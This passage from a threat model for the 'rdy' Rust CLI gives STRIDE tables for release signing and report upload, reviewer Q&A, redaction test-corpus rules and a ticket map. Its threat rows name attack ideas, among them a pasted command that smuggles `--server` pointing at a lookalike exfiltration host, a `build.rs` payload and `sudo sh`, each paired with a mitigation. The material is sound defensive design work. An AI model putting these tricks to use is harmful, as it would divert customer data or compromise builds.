| T3 | Asset swapped after publish | Stolen token re-uploads | L | H | `[M1]` Signature check; immutable releases if the sandbox proof passes. | SEC-06 and SEC-07 (M1-010), SEC-09 and SEC-10 (M1-015) |
| T4 | Compromised Action | Retargeted tag, as with `tj-actions/changed-files` in March 2025 | M | H | `[M1]` SHA pins, zizmor, minimal `permissions`, `id-token: write` only in sign-release. | SEC-01 (M1-005), SEC-03 (M1-011) |
| T5 | Malicious dependency | `build.rs` payload | M | H | `[M1]` Lockfile, `--locked`, crates.io only, cargo-deny, new-dependency review. | SEC-01 (M1-005), M1-004 |
| R1 | Unattributable release | "Who published this?" | L | M | `[M1]` Rekor entry, tag rulesets, audit log. | SEC-06 and SEC-07 (M1-010) |
| I1 | Long-lived secrets leak | Token in a CI log | L | M | `[M1]` Keyless signing. `[M2+]` crates.io trusted publishing. | 06 |
| E1 | Installer as root | `sudo sh` | M | M | `[M1]` Refuses uid 0 without `--allow-root`; never sudo (06). | SEC-08 (M1-014) |
| E2 | Maintainer takeover | Attacker pushes a tag | L | H | `[M1]` MFA, tag ruleset, manual approval on `release`. | SEC-04 (M1-011), 06 rulesets |

## Appendix D: Surface 4 STRIDE (M2)

| # | Threat | Example | L | I | Mitigation | Ticket |
|---|---|---|---|---|---|---|
| S1 | Fake portal | Pasted command adds `--server https://app.getrdy-io.example` | M | H | Fixed default server. `--server` is argv only, an `https` origin with no userinfo, path or query. A non-default server is bold in the prompt and the receipt, and `--yes` does not skip the TTY question for it. | SEC-41 (M2-078), M2-077 |
| S2 | Stolen token posts fake results | Poisoned vendor dashboard | M | M | Write-only, per link, expiring, revocable, rate limited; results labelled customer-reported. | SEC-42 (M2-027) |
| T1 | Body altered in transit | Intercepting proxy edits it | L | M | TLS; `Content-Digest`; the echoed `received_bytes` and `sha256` must equal the client's (INV-25). | SEC-41 (M2-078) |
| T2 | Server drives the client | Response asks for more data, or names a URL | L | H | Only fixed-grammar ids, a byte count and a hash are read. URLs are built locally. Error codes map to fixed messages. At most 64 KiB of a response is read. | SEC-41 (M2-078) |
| T3 | File changed after consent | The file is swapped between the prompt and the send | L | H | One handle from pre-flight to send, re-hashed in flight, last chunk held back; a mismatch exits 70 (INV-25). | SEC-41 (M2-078) |
| R1 | Customer cannot prove what left | Dispute | M | M | Exact on-disk bytes plus the receipt. | SEC-41 (M2-078) |
| I1 | Upload without consent | Default sends data | L | H | Command or flag plus a yes; a non-TTY run needs `--yes`; no socket or DNS query for the origin before the answer (INV-27). | SEC-41 (M2-078), M2-080 |
| I2 | Unredacted data leaves | A file outside the output dir, or a redactor gap | M | H | Input is a typed `Report` or a bundle whose manifest and hashes verify. The pre-flight residual scan exits 64 on a hit (INV-21, INV-24). | SEC-41 (M2-078), M2-076, M2-060, SEC-44 (M2-061) |
| I3 | Token leaks | argv, shell history, proxy logs | H | M | Env, file or prompt; an argv `--token` exits 64; the format is checked before any request; header only; masked in output; the `rdy_st_` prefix is caught by the redactor (INV-26). | SEC-41 (M2-078), SEC-42 (M2-027), M2-077 |
| I4 | Cross-tenant leak | One vendor sees another's results | L | H | rdy-cloud's own threat model, before the M2 beta. | none here |
| I5 | Personal data in a bundle | Emails in logs and events | M | M | Emails are redacted by default in bundles. Only the customer's argv `--keep-emails` turns that off, and the consent screen and the manifest say so (INV-24). | M2-057 |
| D1 | Oversized upload | 5 GB bundle, zstd bomb, 20,000-entry tar, retry storm | L | L | Bounded decode (257 MiB, 13,000 entries), 100 MiB cap, at most 4 attempts with backoff. | SEC-41 (M2-078), M2-076 |
| E1 | Token grants more than upload | Reads results | L | H | Write-only scope enforced server side. | SEC-42 (M2-027) |

## Appendix E: what a customer security reviewer will ask

| Question | Answer | When |
|---|---|---|
| What does it do on my host? | Reads `/proc`, `/sys` and named files, runs fixed commands, talks to the INV-11 peers. The action log lists it all. | M1 (`--dry-run` M2) |
| Does it need root? | No. It reports what it could not check and never asks for sudo. | M1 |
| Does it phone home? | No telemetry and no update check. Tested under strace with no network. | M1 |
| What can a malicious spec do? | The bounded sentence. | M1 |
| What does it do with cluster-admin? | Reads, plus three self-review POSTs, enforced at runtime. Never Secrets. A read-only ClusterRole ships, so you do not need cluster-admin. | M1 |
| How do I verify the binary? | `scripts/verify-release.sh`: cosign keyless bound to `sign-release.yml`, SHA256SUMS, SBOM, `cargo audit bin`. | M1 |
| How do I know the spec is my vendor's? | You pin the vendor's minisign key for that product. Unpinned or tampered specs are refused. | M1 |
| What is in the report? | Field list on the docs security page. 0600 files, redacted before write. | M1 |
| What leaves the machine? | Nothing by default. Upload shows the file, its hash and the destination first, and keeps a receipt. | M2 |
| Is it memory safe? | Rust, `unsafe` forbidden outside one documented FFI module, dependencies gated by cargo-deny. | M1 |
| Third-party audit? | Before the Enterprise tier. This threat model is public until then. | M5 |
| How do I report a bug? | SECURITY.md. | M1 |

## Appendix F: redaction corpus requirements (for 04)

04 section 4 and Appendix D are the design. This model holds it to these requirements:

- Layout: `tests/fixtures/redaction/<category>/<case>.in`, `.expected` and `.toml` (`polarity`, the
  `rules` that must fire, `since`, `rulesets` and `secrets`). Replacements are `[REDACTED:<rule>:<tag>]`.
  The harness runs with a fixed key and replaces each tag with `~`.
- All values are synthetic. Use vendor-documented examples (`AKIAIOSFODNN7EXAMPLE`). Values that push
  protection would block are built from parts in `synthetic.toml`.
- M1 categories: URL userinfo, bearer and basic auth, API key headers, AWS keys, PEM private keys,
  kubeconfig credentials, `rdy_st_` tokens, JWTs, and secrets by key name in env, YAML, JSON, INI and
  `--flag=`. M2 adds emails (on by default in bundles; only the customer's `--keep-emails` turns them
  off), SaaS token prefixes, GCP and Azure credentials, Kubernetes Secret data, entropy, opt-in IPs and
  MAC, and custom spec patterns. The M1 report set has no email rule, so the report can show the
  Kubernetes user (SEC-24).
- Hostile cases: JSON-escaped, URL-encoded, quoted, multi-line and ANSI-wrapped values; overlapping
  matches (span union); a fake placeholder prefix; negatives (git SHAs, UUIDs, certificates, unexpanded
  variable references, stem false positives such as `passed: 12`). Cap-boundary cases are M1: for each
  facade cap, a canary at offsets cap minus 1 to cap minus 64 (ADR 0015 decision 9, M1-061).
  Chunk-boundary cases at every split offset are M2, when redaction streams (SEC-44).
- Counts: 28 cases in M1 (23 positive, 5 negative). 60 in M2 (11 negative, 2 known gaps). `FLOOR` holds
  the count.
- Bars: the gate is rule coverage, not count. CI fails on a surviving `secrets` string, a rule that did
  not fire, an `.expected` mismatch, an idempotence or residual failure, a rule or syntax form with no
  positive case, or fewer cases than `FLOOR`. Golden negatives match exactly from M1. The 2%
  false-positive budget applies to the M2 reference log corpus. Every missed-secret report adds a case
  before the fix.

## Plan corrections found

- ADR 0010 decision 4 vs 03 `k8s.admission`: ADR 0010 allows no non-GET except review kinds, and 03 adds
  a dry-run pod create. Fix: the M1 guard rejects it. 03 moves `dry_run` to M2 behind an ADR 0010
  amendment.
- ADR 0010 uses `--kube-context`, while 03 and this document used `--context`. Settled: `--kube-context`
  (00, cli-ux final names).
- ADR 0011 decision 5 publishes no `rdy-cli` package, while 06 reserves names. Fix: reserve a placeholder
  that points to `rdy` (ADR review SF-12).
- ADR 0001 line 15 calls RUSTSEC-2025-0068 "unsound libyml". 0068 is `serde_yml`; 0067 is `libyml`.
- `docs/plan/rdy-plan.md` still names competitors in several tables and the Sources list. The founder's
  rule covers the whole repo. Fix: the plan owner scrubs it.
- `11-backlog.md` M1-063 and M1-138 say "first 30 cases". 04 and Appendix F say 28 in M1, gated on rule
  coverage. Fix: M1-063 and M1-138 say 28.
- The first draft's other corrections (install URL, cosign vs vendor keys, token on argv, curl flags,
  `serde_yaml`, `self_update`, M1 redaction, `custom.exec` milestone, file globs, report link) are now
  settled by ADRs 0001 to 0016, 04, 06 and the ADR reviews. They are not repeated here.

## Decisions needing an ADR

- Dry-run pod create for `k8s.admission`: amend ADR 0010 or drop the mode. Conservative choice taken for
  M1: rejected.
- Upload HTTP stack and verifier (Surface 4 requirement 8): before M2-026. Owner: rust-architect.
- Windows and macOS code signing (paid). Deferred to M3 (SEC-50). Owner: release-engineer.

Decided since revision 2: output dir confinement with `cap-std` (ADR 0016); the M1 redactor in
`rdy_engine::redact` (ADR 0015, amended in M1-009 with span union, keyed tags, `Redacted<T>` and `ring`);
a failing signature is refused even with `--allow-unsigned` (ADR 0002 decision 7).

## Tickets implied

`11-backlog.md` holds every SEC ticket with its final title, owner, estimate, dependencies and exit test.
This section keeps the SEC ids stable and maps each one to its 11 id. A fold is an exit-test clause on
the 11 ticket named. 05 revision 3 itself is part of M1-001.

### M1

| SEC id | 11 id | Ticket | 0.1.0 gate in M1-138 |
|---|---|---|---|
| SEC-01 | M1-005 | CI lint and deny job: fmt, clippy, doc, cargo-deny, zizmor | no |
| SEC-03 | M1-011 | SHA pins on every `uses:` line (fold) | no |
| SEC-04 | M1-011 | Org 2FA, private reporting, immutable releases, CODEOWNERS and a settings check script | yes |
| SEC-05 | M1-008 | Harden getrdy.io domain and hosting accounts | yes |
| SEC-06, SEC-07 | M1-010 | sign-release with cosign keyless, SHA256SUMS and self-verify | no |
| SEC-08 | M1-014 | install.sh core with root refusal, truncation guard, sha256 and shell tests | no |
| SEC-09, SEC-10 | M1-015 | install.sh signature check, fail closed, with tamper tests | no |
| SEC-17 | M1-040 | Mediated Context handles with action log and read denylist | yes |
| SEC-18 | M1-039 | Command policy: search path, declared directories, caps and Windows whoami only | no |
| SEC-19 | M1-036 | Confine writes to a new output dir with safe names | yes |
| SEC-21 | M1-094 | Egress address policy, no redirects, no bodies | yes |
| SEC-22 | M1-128 | No-phone-home strace test on Linux CI | yes |
| SEC-24 | M1-103 | Read-only ClusterRole example and kube identity display (fold) | yes |
| SEC-25 | M1-048 | Minimal redactor for evidence, errors and logs | yes |
| SEC-26 | M1-063 | M1 redaction corpus | yes |
| SEC-32 | M1-011 | Security mailbox and security.txt (fold) | yes |
| SEC-59 | M1-130 | Unsigned and unpinned-key banners and hint wording for spec loading | no |
| SEC-60 | M1-122 | Root trust lookup touches no user path, Windows store ACL rules | no |
| SEC-61 | M1-121 | Key fingerprint in the result and forged key id (fold) | no |
| SEC-62 | M1-017 | YAML tags, directives and non-finite floats refused (fold) | no |
| SEC-63 | M1-041 | Result schema caps, identity.kube exec plugin and action log retention | no |
| SEC-64 | M1-078 | Embedded JSON digest equals the .json file (fold) | no |

SEC-20 and SEC-23 were retired as duplicates in 02; the privilege refusal they covered is M1-042. SEC-31
moved to M3 with the hosted docs site (below). Every M1 SEC ticket is core, so M1-138 depends on it even
where the last column says no.

Folds from revision 2 and where they live now:

| Fold | 11 id |
|---|---|
| Verify before parse, trusted-comment prefix, `allow_legacy = false`, weak-key vectors (INV-01 to INV-03) | M1-120 |
| Root-only store and ownership rules (INV-04) | M1-121 |
| `--allow-unsigned` argv only, hints never name the flag (INV-05) | M1-126 |
| Keygen and sign key hygiene | M1-125 |
| Fixed PATH, process-group kill, sudo family refused (INV-08) | M1-039, M1-038 |
| Runtime kube guard layer and test (INV-14) | M1-103, M1-104 |
| Embedded JSON escapes and exact CSP (INV-16) | M1-078 |
| Privilege-carrying binary refusal (INV-10) | M1-042 |
| Control-character escaping (INV-17) | M1-021 |
| Redaction rules, logs, truncated buffers, redact then cap (INV-15, 04) | M1-060, M1-056, M1-061, M1-062 |

### M2 and later

| SEC id | 11 id | Ticket |
|---|---|---|
| SEC-02 | M2-012 | Scheduled audit.yml: cargo-audit, deny advisories, issue on failure |
| SEC-40 | M2-040 | `rdy run --dry-run` preview (was `--plan`) |
| SEC-41 | M2-078 | rdy upload client with consent, receipt and exact bytes |
| SEC-42 | M2-027 | Share-link token format and scope |
| SEC-43 | M2-067 | Bundle collector path policy |
| SEC-44 | M2-061 | Full redaction corpus with chunk-boundary cases |
| SEC-45 | M2-063 | Fuzz targets for spec parser and redactor |
| SEC-46 | M2-032 | Vendor key rotation, signed_at and serial rollback warnings |
| SEC-47 | M2-033 | Portal-delivered spec and key trust |
| SEC-56 | M2-034 | TTY confirmation for unsigned specs |
| SEC-57 | M2-084 | Contact-set tests on macOS and Windows |
| SEC-58 | M2-085 | Windows output dir ACL hardening |
| SEC-65 | M2-062 | Redaction span union with hostile custom patterns |
| SEC-66 | M2-068 | rdy bundle ignores spec collectors unless the spec is verified with a pinned key |
| SEC-31 | M3-008 | Docs security page and verify-first install (extended by M3-053) |
| SEC-48 | M3-027 | Read-only cloud API allowlist |
| SEC-49 | M3-048 | Review of verified self-update |
| SEC-50 | M3-045 | macOS notarization and Windows signing |
| SEC-51 | M3-049 | Verify reproducible builds across independent builders |
| SEC-52 | M3-041 | cargo-vet for direct dependencies |
| SEC-53 | M4-016 | Threat model and design note for custom.exec |
| SEC-54 | M5-008 | Independent security audit |
